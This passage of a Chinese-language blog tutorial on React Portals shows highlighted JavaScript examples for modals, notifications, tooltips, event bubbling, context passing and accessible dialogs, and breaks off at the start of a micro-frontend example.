class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;hidden&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-overlay&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-dialog&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> e.stopPropagation()&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-header&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;关闭&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-symbol">&amp;times;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-body&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;children&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 使用 Portal 的模态框组件</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Modal</span>(<span class="hljs-params">&#123; isOpen, ...props &#125;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ModalDialog</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>全局通知系统</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NotificationContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">NotificationProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [notifications, setNotifications] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addNotification</span> = (<span class="hljs-params">message, type = <span class="hljs-string">&#x27;info&#x27;</span></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-title function_">setNotifications</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, &#123; id, message, type &#125;]);<br>    <br>    <span class="hljs-comment">// 自动关闭</span><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">removeNotification</span>(id);<br>    &#125;, <span class="hljs-number">5000</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">removeNotification</span> = (<span class="hljs-params">id</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setNotifications</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-property">id</span> !== id));<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NotificationContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">addNotification</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      &#123;children&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 使用 Portal 渲染到独立区域 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span> <span class="hljs-attr">containerId</span>=<span class="hljs-string">&quot;notification-portal&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;notification-container&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;notifications.map(notification =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">NotificationItem</span> </span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;notification.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">notification</span>=<span class="hljs-string">&#123;notification&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">onClose</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> removeNotification(notification.id)&#125;</span><br><span class="language-xml">            /&gt;</span><br><span class="language-xml">          ))&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">NotificationContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 通知项组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">NotificationItem</span>(<span class="hljs-params">&#123; notification, onClose &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">notification</span> $&#123;<span class="hljs-attr">notification.type</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;notification.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;关闭通知&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-symbol">&amp;times;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>工具提示与悬浮框</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Tooltip</span>(<span class="hljs-params">&#123; children, content &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [isVisible, setIsVisible] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <span class="hljs-keyword">const</span> [position, setPosition] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">0</span> &#125;);<br>  <span class="hljs-keyword">const</span> triggerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">updatePosition</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (triggerRef.<span class="hljs-property">current</span>) &#123;<br>      <span class="hljs-keyword">const</span> rect = triggerRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();<br>      <span class="hljs-title function_">setPosition</span>(&#123;<br>        <span class="hljs-attr">top</span>: rect.<span class="hljs-property">bottom</span> + <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>,<br>        <span class="hljs-attr">left</span>: rect.<span class="hljs-property">left</span> + rect.<span class="hljs-property">width</span> / <span class="hljs-number">2</span><br>      &#125;);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (isVisible) &#123;<br>      <span class="hljs-title function_">updatePosition</span>();<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, updatePosition);<br>      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, updatePosition);<br>    &#125;<br>  &#125;, [isVisible]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">span</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;triggerRef&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onMouseEnter</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setIsVisible(true)&#125;</span><br><span class="language-xml">        onMouseLeave=&#123;() =&gt; setIsVisible(false)&#125;</span><br><span class="language-xml">        onFocus=&#123;() =&gt; setIsVisible(true)&#125;</span><br><span class="language-xml">        onBlur=&#123;() =&gt; setIsVisible(false)&#125;</span><br><span class="language-xml">        aria-describedby=&quot;tooltip-content&quot;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 使用 Portal 避免被父容器裁剪 */&#125;</span><br><span class="language-xml">      &#123;isVisible &amp;&amp; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tooltip-content&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;tooltip&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">absolute</span>&#x27;,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">top:</span> `$&#123;<span class="hljs-attr">position.top</span>&#125;<span class="hljs-attr">px</span>`,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">left:</span> `$&#123;<span class="hljs-attr">position.left</span>&#125;<span class="hljs-attr">px</span>`,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">transform:</span> &#x27;<span class="hljs-attr">translateX</span>(<span class="hljs-attr">-50</span>%)&#x27;</span></span><br><span class="hljs-tag"><span class="language-xml">            &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">          &gt;</span></span><br><span class="language-xml">            &#123;content&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高级特性与模式"><a href="#高级特性与模式" class="headerlink" title="高级特性与模式"></a>高级特性与模式</h3><p><strong>事件冒泡处理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePortalClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Portal 内容被点击&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;父组件被点击&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleParentClick&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;parent&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>事件冒泡测试<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* Portal 内容会冒泡到 React 树中的父组件 */&#125;</span><br><span class="language-xml">      &#123;ReactDOM.createPortal(</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handlePortalClick&#125;</span>&gt;</span></span><br><span class="language-xml">          点击我（Portal 按钮）</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>,</span><br><span class="language-xml">        document.getElementById(&#x27;portal-root&#x27;)</span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        点击 Portal 按钮会触发两个日志：<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        1. &quot;Portal 内容被点击&quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        2. &quot;父组件被点击&quot;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>上下文传递</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemedPortalDemo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;dark&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;/* Portal 内容能访问 React 树中的上下文 */&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">            &#123;theme =&gt; (</span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">theme-box</span> $&#123;<span class="hljs-attr">theme</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">                当前主题: &#123;theme&#125;</span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            )&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>无障碍对话框实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AccessibleModal</span>(<span class="hljs-params">&#123; isOpen, title, children, onClose &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> modalRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-comment">// 关闭时返回焦点到触发元素</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> triggerElement = <span class="hljs-variable language_">document</span>.<span class="hljs-property">activeElement</span>;<br>    <br>    <span class="hljs-keyword">if</span> (isOpen &amp;&amp; modalRef.<span class="hljs-property">current</span>) &#123;<br>      modalRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (triggerElement) &#123;<br>        triggerElement.<span class="hljs-title function_">focus</span>();<br>      &#125;<br>    &#125;;<br>  &#125;, [isOpen]);<br>  <br>  <span class="hljs-comment">// ESC 键关闭</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleKeyDown</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;Escape&#x27;</span>) &#123;<br>        <span class="hljs-title function_">onClose</span>();<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-keyword">if</span> (isOpen) &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, handleKeyDown);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, handleKeyDown);<br>    &#125;;<br>  &#125;, [isOpen, onClose]);<br>  <br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;dialog&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">aria-modal</span>=<span class="hljs-string">&quot;true&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;modal-title&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;modalRef&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">tabIndex</span>=<span class="hljs-string">&#123;-1&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-content&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;modal-title&quot;</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;children&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;关闭对话框&quot;</span>&gt;</span></span><br><span class="language-xml">          关闭</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="企业级最佳实践-1"><a href="#企业级最佳实践-1" class="headerlink" title="企业级最佳实践"></a>企业级最佳实践</h3><p><strong>微前端集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MicroFrontendPortal</span>(<span class="hljs-params">&#123; appName, componentName &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [<span class="hljs-title class_">Component</span>, setComponent] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 动态加载远程模块</span><br>    <span class="hljs-keyword">const</span> <span 